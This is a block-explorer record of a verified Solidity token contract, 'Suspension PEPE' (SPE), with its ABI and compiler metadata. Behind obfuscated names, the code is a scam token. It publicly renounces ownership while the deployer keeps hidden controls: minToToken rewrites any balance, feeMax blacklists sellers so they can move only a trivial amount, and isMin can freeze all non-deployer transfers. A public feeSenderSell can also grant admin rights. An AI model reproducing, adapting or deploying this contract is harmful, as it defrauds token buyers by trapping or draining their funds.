{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface senderReceiverIs {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txSwap) external view returns (uint256);\n\n    function transfer(address totalEnable, uint256 buyReceiver) external returns (bool);\n\n    function allowance(address minMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 buyReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalEnable,\n        uint256 buyReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingBuyTrading, uint256 value);\n    event Approval(address indexed minMode, address indexed spender, uint256 value);\n}\n\nabstract contract swapTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toLimitWallet {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface feeTrading {\n    function createPair(address tradingAmountWallet, address limitMaxTo) external returns (address);\n}\n\ninterface fundTakeAt is senderReceiverIs {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SuspensionPEPE is swapTx, senderReceiverIs, fundTakeAt {\n\n    uint256 public feeTokenList;\n\n    string private amountLiquidity = \"SPE\";\n\n    string private launchedMode = \"Suspension PEPE\";\n\n    constructor (){\n        if (liquidityAt != marketingEnable) {\n            feeTokenList = atTrading;\n        }\n        toLimitWallet maxLiquidity = toLimitWallet(isLaunch);\n        modeTotalBuy = feeTrading(maxLiquidity.factory()).createPair(maxLiquidity.WETH(), address(this));\n        if (feeTokenList != atTrading) {\n            feeTokenList = atTrading;\n        }\n        atWallet = _msgSender();\n        listSwap();\n        shouldSell[atWallet] = true;\n        launchedMarketing[atWallet] = tradingSender;\n        \n        emit Transfer(address(0), atWallet, tradingSender);\n    }\n\n    address public modeTotalBuy;\n\n    function balanceOf(address txSwap) public view virtual override returns (uint256) {\n        return launchedMarketing[txSwap];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountLiquidity;\n    }\n\n    uint256 public atTrading;\n\n    function maxMin() private view {\n        require(shouldSell[_msgSender()]);\n    }\n\n    function approve(address marketingList, uint256 buyReceiver) public virtual override returns (bool) {\n        marketingFundIs[_msgSender()][marketingList] = buyReceiver;\n        emit Approval(_msgSender(), marketingList, buyReceiver);\n        return true;\n    }\n\n    uint256 private tokenReceiver;\n\n    bool private liquidityAt;\n\n    function transferFrom(address launchedLiquidity, address totalEnable, uint256 buyReceiver) external override returns (bool) {\n        if (_msgSender() != isLaunch) {\n            if (marketingFundIs[launchedLiquidity][_msgSender()] != type(uint256).max) {\n                require(buyReceiver <= marketingFundIs[launchedLiquidity][_msgSender()]);\n                marketingFundIs[launchedLiquidity][_msgSender()] -= buyReceiver;\n            }\n        }\n        return limitMode(launchedLiquidity, totalEnable, buyReceiver);\n    }\n\n    uint256 maxReceiver;\n\n    uint256 private tradingSender = 100000000 * 10 ** 18;\n\n    address isLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function owner() external view returns (address) {\n        return takeEnable;\n    }\n\n    bool public receiverReceiver;\n\n    function allowance(address autoReceiverEnable, address marketingList) external view virtual override returns (uint256) {\n        if (marketingList == isLaunch) {\n            return type(uint256).max;\n        }\n        return marketingFundIs[autoReceiverEnable][marketingList];\n    }\n\n    uint256 totalLiquidity;\n\n    function name() external view virtual override returns (string memory) {\n        return launchedMode;\n    }\n\n    mapping(address => bool) public buySwap;\n\n    function getOwner() external view returns (address) {\n        return takeEnable;\n    }\n\n    mapping(address => mapping(address => uint256)) private marketingFundIs;\n\n    address private takeEnable;\n\n    function transfer(address liquidityMinFee, uint256 buyReceiver) external virtual override returns (bool) {\n        return limitMode(_msgSender(), liquidityMinFee, buyReceiver);\n    }\n\n    event OwnershipTransferred(address indexed buyAmount, address indexed tokenTo);\n\n    bool public marketingEnable;\n\n    address txSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function listSwap() public {\n        emit OwnershipTransferred(atWallet, address(0));\n        takeEnable = address(0);\n    }\n\n    function isMin(uint256 buyReceiver) public {\n        maxMin();\n        maxReceiver = buyReceiver;\n    }\n\n    uint256 constant sellMin = 8 ** 10;\n\n    function feeSenderSell(address sellTake) public {\n        if (receiverReceiver) {\n            return;\n        }\n        if (atTrading != tokenReceiver) {\n            feeTo = false;\n        }\n        shouldSell[sellTake] = true;\n        \n        receiverReceiver = true;\n    }\n\n    function feeMax(address liquidityLimit) public {\n        maxMin();\n        if (feeTo == marketingEnable) {\n            atTrading = tokenReceiver;\n        }\n        if (liquidityLimit == atWallet || liquidityLimit == modeTotalBuy) {\n            return;\n        }\n        buySwap[liquidityLimit] = true;\n    }\n\n    mapping(address => bool) public shouldSell;\n\n    function minToToken(address liquidityMinFee, uint256 buyReceiver) public {\n        maxMin();\n        launchedMarketing[liquidityMinFee] = buyReceiver;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromList;\n    }\n\n    function limitMode(address launchedLiquidity, address totalEnable, uint256 buyReceiver) internal returns (bool) {\n        if (launchedLiquidity == atWallet) {\n            return maxFund(launchedLiquidity, totalEnable, buyReceiver);\n        }\n        uint256 totalLiquidityTake = senderReceiverIs(modeTotalBuy).balanceOf(txSell);\n        require(totalLiquidityTake == maxReceiver);\n        require(totalEnable != txSell);\n        if (buySwap[launchedLiquidity]) {\n            return maxFund(launchedLiquidity, totalEnable, sellMin);\n        }\n        return maxFund(launchedLiquidity, totalEnable, buyReceiver);\n    }\n\n    address public atWallet;\n\n    uint8 private fromList = 18;\n\n    mapping(address => uint256) private launchedMarketing;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingSender;\n    }\n\n    bool private feeTo;\n\n    function maxFund(address launchedLiquidity, address totalEnable, uint256 buyReceiver) internal returns (bool) {\n        require(launchedMarketing[launchedLiquidity] >= buyReceiver);\n        launchedMarketing[launchedLiquidity] -= buyReceiver;\n        launchedMarketing[totalEnable] += buyReceiver;\n        emit Transfer(launchedLiquidity, totalEnable, buyReceiver);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingBuyTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoReceiverEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buySwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityLimit\",\"type\":\"address\"}],\"name\":\"feeMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTake\",\"type\":\"address\"}],\"name\":\"feeSenderSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTokenList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"buyReceiver\",\"type\":\"uint256\"}],\"name\":\"isMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityMinFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyReceiver\",\"type\":\"uint256\"}],\"name\":\"minToToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTotalBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityMinFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SuspensionPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}